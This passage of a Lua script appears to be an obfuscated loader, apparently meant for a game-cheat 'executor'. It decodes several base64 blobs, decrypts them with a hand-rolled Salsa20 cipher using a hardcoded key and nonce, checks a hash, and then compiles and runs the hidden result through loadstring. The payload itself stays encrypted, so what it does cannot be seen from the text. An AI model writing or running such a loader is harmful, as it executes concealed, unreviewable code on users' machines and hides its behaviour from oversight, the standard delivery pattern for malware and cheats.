RZKPrW+HyFyyLwRcNbq3gPNLaJFuUGA/vJXpfQ6KaLdYh3etfsiuJ2v/p4flj3hVLx55bf9fxC/zh3d44OTWTE/hcyteR6qcHkekfCeBqZz9Njk+AJG/boT9DVHf/v9LPhyT9D5KfLPtu1ezhd1PVO/uJzL/PJYc96hP8YAtbobitCnJg66sxLzpKlBlfu87U0oQ4cSm4mmj0AlxkUR0SOjUJjYKY98Cd0IKeQxY9h9f7DrL+3vnxtEaQzkISCQyOoE91H4X4PRtFWlPMmekJMGQvOH4sIVVys6EJ9LkVsIFl91TY2HnRMrMXpjqELa"
  local _b8 = "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"
  local _b9 = "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"
  local _b10 = "w0DaKnVARofpGfMExvchbLCRYRTSw350+R7aPRFwhgV52oQCSiLFd/O9FjNnYh2WKUzoNZp/QDf82IBf4iUZ1Q/TkfGUzG/6w94H+39+j7/NNjfj2AMll1E4eCYs14L6F3O2sqq0nu69Fw3NMUEDoBvojdZIUsySCvr4sSVaj/62Vp5pIn5dRLJ0tyBpIKaXamlKLcwfNYFiwGp7Gn02d8wyF/c/xWpZFzu5WnWHHiTQWrcgX/o1k/Lq19fFvwa2asKVgyceGRXCtdkgAvQnso0pTSdJGxN0WzPuZq6fjn/wSBVWElUCkk0Y/LB44YfPgfdXSVteM6XbuwjCgpDR+u3JZSqLhfY842xWkr48OWFMe0mVRu1OsqLsMN3YiUMXMSUqsEgtJQdffdZkLhDewW8BWWCMC1QI/BmeqwDXsKxxbLDxzFv2mBzER/R7+LbsZLROhHNiPaAaTD7xyjll2/BO8ydJJccwviPhbK4d2ApjL0q1RsDP4+W/o7b3Uab/PcjkR5dAFJN0xmIsSJ3NhpRCcOBZ8eBedCckE7KIV2rx3bkl/FCLkTJSjLgaiz8zXsM/ll1a8SBJVeTLtqsVZXkPD1r2hKiC1aEEQ00qak1wabnjHSXkOydofGbNdQmS8kLyCEGt+Gkd0+VXsxxsePgYVm8gTxA8tdTv9vrJnIn8ZGfZutsc/qp+6/4eHT8l5eyRyIHSbBw8elixVkRdTzlqS+9cQ9IewhOCHQLJ6RnC6SrI7Kl1NGFOBNxWmyE3uShCuZmKzploWZqmZ+2HFikwBpgivBgv1zzoRF1A07r9dWeWfyT0sV/VlXPDxptfFKf1JnbKJePSo4tzp+gDKAqVSnVyXlReyw33AaWMM0af2/usDmvB0eMWZUMs8O7+qkjXcu8YiiiAeAhWjLGHEy/1ouSD9k6A3DpALZdn2K13B+jkQaLDyTkpAvERsKpwdXZjWbB36E68Lrt3/pIa7WvRnFpcqvX0KMvNWJM4SwP6HGnt1R+e2TKy1e8a1HcaCvIcLJsqykHBv8WR7VBWmdPybrUmaUUiU3Um99YtqOEI02oDlyMcYOmMW1XpV4Uv5H4yTZq1cAqMDgOsDgHGm5s/9d0/P4gunSee9ip6XFsnfM9QvTqVBbkxS5LjEjdr8YJDuox2/iyGoQ132eb0spa7+/BS4nFWLSQ7eoeb2BZNT2i+b2c0CiD8E/KkswFl39hDCGkW+boChSuH+L28rXNDF11X4DP75jPkcpo4u+J7ty/l3agqrrUfZM/B/SdgRBr6uQwnaORA3m7xx5U2oCh0bYA+cwizgcCAvycZAzQC3j2hb7soA/mHlbquWFbDneWmr6oZnkW5c2LytSfIggaV"

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _rbq = _hex2bin("a1824cc78cef102edfbcbb235b4f3492c3b6d220bf1c5797302beff09347b6b4")
  local _fju = _hex2bin("96f67dd467f737f0")

  if #_rbq ~= 32 or #_fju ~= 8 then
    _mji = "invalid key/nonce"
    return
  end

  local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

  local function _block(k32, n32, ctr_lo, ctr_hi)
    local s = {
      SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
      ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
    }
    local o = {}
    for i = 1, 16 do o[i] = s[i] end

    local function qr(a, b, c2, d)
      s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
      s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
      s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
      s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
    end

    for _ = 1, 10 do
      qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
      qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
    end

    local out = {}
    for i = 1, 16 do
      local v = (s[i] + o[i]) % 4294967296
      v = math.floor(tonumber(v) or 0)
      out[#out + 1] = _chr(v % 256)
      out[#out + 1] = _chr(math.floor(v / 256) % 256)
      out[#out + 1] = _chr(math.floor(v / 65536) % 256)
      out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
  end

  local k32, n32 = {}, {}
  for i = 1, 8 do
    local p = (i - 1) * 4 + 1
    k32[i] = string.byte(_rbq, p)
           + string.byte(_rbq, p + 1) * 256
           + string.byte(_rbq, p + 2) * 65536
           + string.byte(_rbq, p + 3) * 16777216
  end
  for i = 1, 2 do
    local p = (i - 1) * 4 + 1
    n32[i] = string.byte(_fju, p)
           + string.byte(_fju, p + 1) * 256
           + string.byte(_fju, p + 2) * 65536
           + string.byte(_fju, p + 3) * 16777216
  end

  local raw = _b64d(table.concat({_b0, _b1, _b2, _b3, _b4, _b5, _b6, _b7, _b8, _b9, _b10}))
  local dec = {}
  local counter = 0
  local acc = {}

  for pos = 1, #raw, 64 do
    local lo = counter % 4294967296
    local hi = math.floor(counter / 4294967296) % 4294967296
    local block = _block(k32, n32, lo, hi)
    counter = counter + 1
    for i = 1, 64 do
      local idx = pos + i - 1
      if idx > #raw then break end
      acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
    end
    if #acc >= 4096 then
      dec[#dec + 1] = table.concat(acc)
      acc = {}
    end
  end
  if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

  _lef = table.concat(dec)

  local h = 0
  for i = 1, #_lef do
    h = (h * 16777619 + string.byte(_lef, i)) % 4294967296
  end
  if h ~= 3404436768 then
    _mji = "hash mismatch"
    return
  end

  local _load = loadstring or load
  if not _load and getfenv then
    local ok, f = pcall(getfenv)
    if ok and type(f) == "table" then _load = f.loadstring or f.load end
  end
  if not _load then
    _mji = "no loadstring available in this executor"
    return
  end

  local _okTest, _compiledTest = _pkh(_load, "return 2+2")
  if not _okTest or not _compiledTest then
    _mji = "loadstring check failed"
    return
  end
  local _okRun, _res = _pkh(_compiledTest)
  if not _okRun or _res ~= 4 then
    _mji = "loadstring execution check failed"
    return
  end

  local _okComp, _fn = _pkh(_load, _lef)
  if not _okComp or not _fn then
    _mji = "compilation failed"
    return
  end

  local _okExec, _execErr = _pkh(_fn)
  if not _okExec then
    _mji = "execution failed: " .. tostring(_execErr)
  end
end

local _okGlobal, _globalErr = _pkh(_safeRun)
if not _okGlobal then
  warn("[obf] wrapper crashed: " .. tostring(_globalErr))
elseif _mji then
  warn("[obf] " .. tostring(_mji))
end
